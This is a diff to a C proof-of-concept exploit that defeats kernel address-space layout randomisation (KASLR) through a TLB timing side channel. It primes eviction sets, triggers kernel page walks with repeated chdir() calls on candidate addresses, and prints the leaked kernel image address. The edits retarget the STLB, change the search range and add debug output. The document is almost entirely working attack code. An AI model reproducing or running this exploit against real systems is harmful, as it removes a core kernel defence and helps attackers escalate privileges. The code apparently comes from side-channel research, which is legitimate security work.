@@ -11,7 +11,7 @@
 #include <time.h>
 #include <unistd.h>
 
-#define CALIBRATION_ITERS 100000
+#define CALIBRATION_ITERS 1000000
 
 #define PASTE3_INTERNAL(a, b, c) a##b##c
 #define PASTE3(a, b, c) PASTE3_INTERNAL(a, b, c)
@@ -20,10 +20,10 @@
 
 #define _EMPTY_SUFFIX
 
-// #define CONFIG_TARGET_STLB 1
-#define CONFIG_TARGET_DTLB 1
+#define CONFIG_TARGET_STLB 1
+//#define CONFIG_TARGET_DTLB 1
 
-#define USE_POINTER_CHASING 1
+#define USE_POINTER_CHASING 0
 
 #if defined(CONFIG_TARGET_STLB)
 #define TARGET_FUNC_SUFFIX stlb
@@ -54,7 +54,7 @@ uint64_t *res;
 char *user = "./";
 //------------------------//
 
-int leak_val(void *addr) {
+static inline int leak_val(void *addr) {
   chdir(addr);
   chdir(addr);
   chdir(addr);
@@ -68,7 +68,7 @@ void get_cycle(uint64_t *valid_cycle, uint64_t *invalid_cycle) {
   char *test_addr;
   posix_memalign(&test_addr, PAGE_SIZE, PAGE_SIZE);
   *test_addr = 1;
-  gen_eset(test_addr, eset);
+  gen_eset((size_t)test_addr, eset);
 
   tmp = 0;
   for (int i = 0; i < CALIBRATION_ITERS; i++) {
@@ -91,10 +91,12 @@ void get_cycle(uint64_t *valid_cycle, uint64_t *invalid_cycle) {
 int main(int argc, char *argv[]) {
   void *addr;
   void *eset[EVSET_SIZE];
-  void *target[TRAINING_ITERS] = {user, user, user, user, user, user};
+  void *target[TRAINING_ITERS] = {user, user, user, user, user, user, user, user, user, user, user, user, user, user, user, user, user, user, user, user};
   uint64_t valid_cycle, invalid_cycle;
   struct timeval tv_s, tv_e;
   register uint64_t tmp, threshold;
+
+  printf("[+] number of slots = %llx\n", NUM_SLOT);
 
   // res = (uint64_t *)malloc(sizeof(uint64_t) * NUM_SLOT);
   res = mmap(0, sizeof(uint64_t) * NUM_SLOT, PROT_READ | PROT_WRITE,
@@ -125,26 +127,42 @@ int main(int argc, char *argv[]) {
 
   gettimeofday(&tv_s, NULL);
 
+  //for (int i = 0; i < ITERATION; i++) {
+  //  printf("[+] Iteration = %d\n", i);
+  //  for (uint64_t s_idx = 0; s_idx < NUM_SLOT; s_idx++) {
+  //    idx = (s_idx * 73) % NUM_SLOT;
+  //    addr = (void *)KERN_MAP_MIN_ADDR + (ALIGN_SIZE * idx);
+  //    target[TRAINING_ITERS - 1] = addr;
+  //    gen_eset((size_t)addr, eset);
+  //    do {
+  //      for (int j = 0; j < TRAINING_ITERS; j++) {
+  //        prime(eset);
+  //        leak_val(target[j]);
+  //      }
+  //      tmp = probe(eset);
+  //    } while (tmp < (invalid_cycle - 200) || tmp > (valid_cycle + 200));
+  //    res[idx] += tmp;
+  //  }
+  //}
   for (int i = 0; i < ITERATION; i++) {
+    printf("[+] Iteration = %d\n", i);
     for (uint64_t s_idx = 0; s_idx < NUM_SLOT; s_idx++) {
+      //printf("  [+] %lu/%lu\n", s_idx, NUM_SLOT);
       idx = (s_idx * 73) % NUM_SLOT;
-      addr = (void *)KERN_MAP_MIN_ADDR + (ALIGN_SIZE * idx);
+      addr = (void *)START_SEARCH + (ALIGN_SIZE * idx);
       target[TRAINING_ITERS - 1] = addr;
-      gen_eset(addr, eset);
-      do {
-        for (int j = 0; j < TRAINING_ITERS; j++) {
-          prime(eset);
-          leak_val(target[j]);
-        }
-        tmp = probe(eset);
-      } while (tmp < (invalid_cycle - 200) || tmp > (valid_cycle + 200));
-      res[idx] += tmp;
+      gen_eset((size_t)addr, eset);
+      for (int j = 0; j < TRAINING_ITERS; j++) {
+        prime(eset);
+        leak_val(target[j]);
+      }
+      res[idx] += probe(eset);
     }
   }
 
   uint64_t valid_page_cnt = 0;
-  void *end_kern_map_addr = 0;
-  uint64_t kern_size_slot = KERN_MAP_SIZE / ALIGN_SIZE;
+  void *end_kern_img_addr = 0;
+  uint64_t kern_size_slot = (KERN_IMAGE_SIZE / ALIGN_SIZE) + 1;
 
   // TODO make sure all 10 last pages are mapped
   for (uint64_t s_idx = 0; s_idx < NUM_SLOT; s_idx++) {
@@ -155,8 +173,8 @@ int main(int argc, char *argv[]) {
         for (int s_jdx = s_idx + kern_size_slot; s_jdx > 0; s_jdx--) {
           if (res[s_jdx] / ITERATION > threshold) {
             if (valid_page_cnt == 0) {
-              end_kern_map_addr =
-                  (void *)KERN_MAP_MIN_ADDR + (ALIGN_SIZE * s_jdx);
+              end_kern_img_addr =
+                  (void *)START_SEARCH + (ALIGN_SIZE * s_jdx);
               valid_page_cnt++;
             } else if (valid_page_cnt > 10) {
               break;
@@ -180,20 +198,24 @@ int main(int argc, char *argv[]) {
   double end = (tv_e.tv_sec) * 1000 + (tv_e.tv_usec) / 1000.0;
   double diff = (end - start) / 1000.0;
 
-  void *kernel_map_addr = end_kern_map_addr - KERN_MAP_SIZE - 0x1000;
+  void *kernel_img_addr = end_kern_img_addr - KERN_IMAGE_SIZE - 0x1000;
+  void *kernel_img_addr2 = end_kern_img_addr - KERN_IMAGE_SIZE;
 
 #ifdef __DEBUG
   char *dfp = fopen(RESULT_FILE, "w");
-  addr = (void *)KERN_MAP_MIN_ADDR;
+  fprintf(dfp, "valid cycles = %d, invalid cycles = %d, threshold = %d\n",
+      valid_cycle, invalid_cycle, threshold);
+  addr = (void *)START_SEARCH;
   for (uint64_t x = 0; x < NUM_SLOT; x++) {
-    addr = (void *)KERN_MAP_MIN_ADDR + (ALIGN_SIZE * x);
+    addr = (void *)START_SEARCH + (ALIGN_SIZE * x);
     fprintf(dfp, "0x%llx %llu\n", addr, res[x] / ITERATION);
   }
-  fprintf(dfp, "0x%llx\n", kernel_map_addr);
+  fprintf(dfp, "kern_img_addr (-0x1000) = 0x%llx\n", kernel_img_addr);
+  fprintf(dfp, "kern_img_addr           = 0x%llx\n", kernel_img_addr2);
   fclose(dfp);
 #endif
 
-  printf("kernel map addr\t= \033[1;31m0x%llx\033[0m\n", kernel_map_addr);
+  printf("kernel map addr\t= \033[1;31m0x%llx\033[0m\n", kernel_img_addr);
   printf("Time to break KASLR\t= %.2fs\n", diff);
   printf("==============================================\n");
   return 0;
